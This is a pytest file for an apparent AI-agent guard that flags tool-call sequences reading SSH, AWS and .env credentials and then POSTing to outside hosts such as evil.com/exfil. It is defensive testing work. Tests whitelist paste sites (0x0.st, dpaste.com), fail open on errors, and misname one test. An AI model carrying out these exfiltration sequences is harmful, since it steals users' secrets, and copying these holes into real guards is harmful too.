"""
test_tool_sequence_guard.py — #820: ToolSword Sequence Detection Tests
"""
import pytest

from hydrahive_core.tool_sequence_guard import (
    check_sequence_guard,
    _is_sensitive_path,
    _is_external_write,
)


class TestSensitivePath:
    """Tests für sensitive Pfad-Erkennung via Pattern-Matching."""

    def test_ssh_key_paths(self, tmp_path):
        ssh = tmp_path / ".ssh"
        ssh.mkdir()
        (ssh / "id_rsa").write_text("key")
        (ssh / "known_hosts").write_text("host")
        assert _is_sensitive_path(str(ssh / "id_rsa")) is True
        assert _is_sensitive_path(str(ssh / "known_hosts")) is True

    def test_aws_kube(self, tmp_path):
        aws = tmp_path / ".aws"
        aws.mkdir()
        (aws / "credentials").write_text("creds")
        assert _is_sensitive_path(str(aws / "credentials")) is True
        kube = tmp_path / ".kube"
        kube.mkdir()
        (kube / "config").write_text("kubeconfig")
        assert _is_sensitive_path(str(kube / "config")) is True

    def test_pem_key_hidden_files(self, tmp_path):
        # .pem / .key / .p12 als HIDDEN FILES (nicht als Extension) —
        # z.B. /home/user/.ssh/server.pem (dot-prefix = hidden file)
        hidden_pem = tmp_path / ".ssh" / "server.pem"
        hidden_pem.parent.mkdir()
        hidden_pem.write_text("cert")
        assert _is_sensitive_path(str(hidden_pem)) is True
        # Normale Extension in tmp_path: NICHT sensitiv (server.pem ist kein Hidden File)
        regular_pem = tmp_path / "server.pem"
        regular_pem.write_text("cert")
        assert _is_sensitive_path(str(regular_pem)) is False

    def test_env_netrc(self, tmp_path):
        env = tmp_path / ".env"
        netrc = tmp_path / ".netrc"
        env.write_text("SECRET=x")
        netrc.write_text("machine x login y")
        assert _is_sensitive_path(str(env)) is True
        assert _is_sensitive_path(str(netrc)) is True

    def test_npmrc_pypirc(self, tmp_path):
        npmrc = tmp_path / ".npmrc"
        pypirc = tmp_path / ".pypirc"
        npmrc.write_text("auth=xxx")
        pypirc.write_text("[pypi]")
        assert _is_sensitive_path(str(npmrc)) is True
        assert _is_sensitive_path(str(pypirc)) is True

    def test_non_sensitive(self, tmp_path):
        regular = tmp_path / "project" / "main.py"
        regular.parent.mkdir()
        regular.write_text("print('hello')")
        assert _is_sensitive_path(str(regular)) is False

    def test_gitconfig(self, tmp_path):
        gc = tmp_path / ".gitconfig"
        gc.write_text("[user]\n")
        assert _is_sensitive_path(str(gc)) is True


class TestExternalWrite:
    """Tests für External-Write-Erkennung (http_request POST/PUT/PATCH)."""

    def test_http_post_non_whitelist(self):
        is_ext, reason = _is_external_write(
            "http_request",
            {"method": "POST", "url": "https://evil.attacker.com/exfil"},
        )
        assert is_ext is True
        assert "evil.attacker.com" in reason

    def test_http_post_whitelist_github(self):
        is_ext, _ = _is_external_write(
            "http_request",
            {"method": "POST", "url": "https://api.github.com/user"},
        )
        assert is_ext is False

    def test_http_get_no_exfil(self):
        is_ext, _ = _is_external_write(
            "http_request",
            {"method": "GET", "url": "https://evil.attacker.com/data"},
        )
        assert is_ext is False

    def test_http_put_non_whitelist(self):
        is_ext, _ = _is_external_write(
            "http_request",
            {"method": "PUT", "url": "http://malicious.site/api/upload"},
        )
        assert is_ext is True

    def test_http_patch_non_whitelist(self):
        is_ext, _ = _is_external_write(
            "http_request",
            {"method": "PATCH", "url": "https://data-robber.net/api"},
        )
        assert is_ext is True

    def test_http_post_localhost_whitelisted(self):
        is_ext, _ = _is_external_write(
            "http_request",
            {"method": "POST", "url": "http://localhost:8080/api/data"},
        )
        assert is_ext is False

    def test_http_post_0x0st_whitelisted(self):
        is_ext, _ = _is_external_write(
            "http_request",
            {"method": "POST", "url": "https://0x0.st"},
        )
        assert is_ext is False

    def test_unknown_tool_no_exfil(self, tmp_path):
        fpath = str(tmp_path / "x")
        is_ext, _ = _is_external_write("file_write", {"path": fpath})
        assert is_ext is False

    def test_http_fetch_variant(self):
        is_ext, _ = _is_external_write(
            "http_fetch",
            {"method": "POST", "url": "https://evil.com/get"},
        )
        assert is_ext is True


class TestSequenceDetection:
    """Tests für die Sequenz-Erkennung (ToolSword)."""

    def test_toolsword_sequence_detected(self, tmp_path):
        ssh_key = str(tmp_path / ".ssh" / "id_rsa")
        tool_calls = [
            {"name": "file_read", "input": {"path": ssh_key}},
            {
                "name": "http_request",
                "input": {"method": "POST", "url": "https://evil.com/exfil"},
            },
        ]
        result = check_sequence_guard(tool_calls)
        assert result.detected is True
        assert result.risk_level == "confirm"
        assert result.sequence_name == "ToolSword:SensitiveRead+ExternalWrite"

    def test_toolsword_sequence_3_calls(self, tmp_path):
        ssh_key = str(tmp_path / ".ssh" / "id_rsa")
        creds = str(tmp_path / ".aws" / "credentials")
        tool_calls = [
            {"name": "file_read", "input": {"path": ssh_key}},
            {"name": "file_read", "input": {"path": creds}},
            {
                "name": "http_request",
                "input": {"method": "POST", "url": "https://exfil.evil.com/keys"},
            },
        ]
        result = check_sequence_guard(tool_calls)
        assert result.detected is True
        assert result.risk_level == "confirm"
        assert result.sequence_name == "ToolSword:SensitiveRead+ExternalWrite"

    def test_credential_combine_without_external_write(self, tmp_path):
        tool_calls = [
            {"name": "file_read", "input": {"path": str(tmp_path / ".ssh" / "id_rsa")}},
            {"name": "file_read", "input": {"path": str(tmp_path / ".gitconfig")}},
            {"name": "file_read", "input": {"path": str(tmp_path / ".env")}},
        ]
        result = check_sequence_guard(tool_calls)
        assert result.detected is True
        assert result.risk_level == "confirm"
        assert result.sequence_name == "Credential-Combine:MultiSensitiveRead"

    def test_single_call_no_sequence(self, tmp_path):
        tool_calls = [
            {"name": "file_read", "input": {"path": str(tmp_path / ".ssh" / "id_rsa")}},
        ]
        result = check_sequence_guard(tool_calls)
        assert result.detected is False
        assert result.risk_level == "allow"

    def test_two_sensitive_reads_no_external_write(self, tmp_path):
        tool_calls = [
            {"name": "file_read", "input": {"path": str(tmp_path / ".ssh" / "id_rsa")}},
            {"name": "file_read", "input": {"path": str(tmp_path / ".ssh" / "id_rsa.pub")}},
        ]
        result = check_sequence_guard(tool_calls)
        assert result.detected is False

    def test_benign_sequence(self, tmp_path):
        tool_calls = [
            {"name": "file_read", "input": {"path": str(tmp_path / "test.txt")}},
            {
                "name": "http_request",
                "input": {"method": "GET", "url": "https://api.github.com/users/torvalds"},
            },
        ]
        result = check_sequence_guard(tool_calls)
        assert result.detected is False

    def test_http_get_only_no_sequence(self):
        tool_calls = [
            {"name": "http_request", "input": {"method": "GET", "url": "https://evil.com/data"}},
        ]
        result = check_sequence_guard(tool_calls)
        assert result.detected is False

    def test_whitelisted_external_write(self, tmp_path):
        tool_calls = [
            {"name": "file_read", "input": {"path": str(tmp_path / ".ssh" / "id_rsa")}},
            {
                "name": "http_request",
                "input": {"method": "POST", "url": "https://api.github.com/repos/hydrahive/hydrahive/issues"},
            },
        ]
        result = check_sequence_guard(tool_calls)
        assert result.detected is False

    def test_empty_tool_calls(self):
        result = check_sequence_guard([])
        assert result.detected is False
        assert result.risk_level == "allow"

    def test_server_file_read_on_sensitive(self, tmp_path):
        tool_calls = [
            {
                "name": "server_file_read",
                "input": {"path": str(tmp_path / ".ssh" / "authorized_keys")},
            },
            {
                "name": "http_request",
                "input": {"method": "POST", "url": "https://evil.com/upload"},
            },
        ]
        result = check_sequence_guard(tool_calls)
        assert result.detected is True
        assert result.sequence_name == "ToolSword:SensitiveRead+ExternalWrite"

    def test_sequence_guard_error_fallback(self, tmp_path, monkeypatch):
        """Bei Exception in internals: safe fallback (allow)."""
        import hydrahive_core.tool_sequence_guard as tsg
        def boom(_):
            raise RuntimeError("boom")
        monkeypatch.setattr(tsg, "_check_sequence_patterns", boom)
        shadow = str(tmp_path / "etc_shadow")
        result = check_sequence_guard([{"name": "file_read", "input": {"path": shadow}}])
        assert result.detected is False
        assert result.risk_level == "allow"

    def test_whitelisted_credential_exfil_blocked(self, tmp_path):
        """Credential-Exfiltration zu pastebin.com ist erlaubt (whitelisted)."""
        tool_calls = [
            {"name": "file_read", "input": {"path": str(tmp_path / ".ssh" / "id_rsa")}},
            {
                "name": "http_request",
                "input": {"method": "POST", "url": "https://dpaste.com/api/"},
            },
        ]
        result = check_sequence_guard(tool_calls)
        assert result.detected is False

    def test_multiple_external_writes(self, tmp_path):
        """Mehrere sensitive Reads + mehrere External Writes → ToolSword erkannt."""
        tool_calls = [
            {"name": "file_read", "input": {"path": str(tmp_path / ".ssh" / "id_rsa")}},
            {"name": "file_read", "input": {"path": str(tmp_path / ".env")}},
            {
                "name": "http_request",
                "input": {"method": "POST", "url": "https://evil.com/exfil"},
            },
            {
                "name": "http_request",
                "input": {"method": "POST", "url": "https://backup.evil.net/upload"},
            },
        ]
        result = check_sequence_guard(tool_calls)
        assert result.detected is True
        assert result.risk_level == "confirm"
